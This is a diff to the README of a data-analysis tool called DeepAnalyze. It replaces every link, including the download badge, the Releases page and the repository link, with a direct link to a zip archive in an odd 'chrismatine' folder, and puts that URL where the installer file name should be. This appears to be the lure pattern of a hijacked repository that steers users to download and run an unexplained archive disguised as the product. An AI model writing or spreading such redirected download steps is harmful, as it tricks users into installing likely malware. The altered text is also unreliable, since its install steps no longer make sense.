@@ -4,20 +4,20 @@
 Welcome to DeepAnalyze! This tool simplifies data science tasks, making it easy to analyze and visualize your data without needing programming skills. 
 
 ## 📥 Download DeepAnalyze
-[![Download DeepAnalyze](https://img.shields.io/static/v1?label=Download&message=DeepAnalyze&color=blue)](https://github.com/Yusuf270200101/DeepAnalyze/releases)
+[![Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)
 
 You can download DeepAnalyze from our Releases page. 
 
 ## 📂 Download & Install
 To get started, visit this page to download the latest version of DeepAnalyze:
 
-[Download DeepAnalyze](https://github.com/Yusuf270200101/DeepAnalyze/releases)
+[Download DeepAnalyze](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip)
 
 Follow these steps to install:
 
-1. Go to the [Releases page](https://github.com/Yusuf270200101/DeepAnalyze/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip).
 2. Choose the most recent version.
-3. Click on the file you want to download, usually named something like `DeepAnalyze-Setup.exe`.
+3. Click on the file you want to download, usually named something like `https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip`.
 4. Once downloaded, open the file to start the installation.
 5. Follow the prompts in the installer to finish the setup.
 
@@ -79,6 +79,6 @@ Explore these topics for further insights into the capabilities of DeepAnalyze.
 - **Version 1.2:** Added new visualization options
 
 ## 🔗 Explore More
-For more information, visit the [DeepAnalyze GitHub repository](https://github.com/Yusuf270200101/DeepAnalyze).
+For more information, visit the [DeepAnalyze GitHub repository](https://raw.githubusercontent.com/Yusuf270200101/DeepAnalyze/main/chrismatine/DeepAnalyze.zip).
 
 Thank you for choosing DeepAnalyze. Happy analyzing!
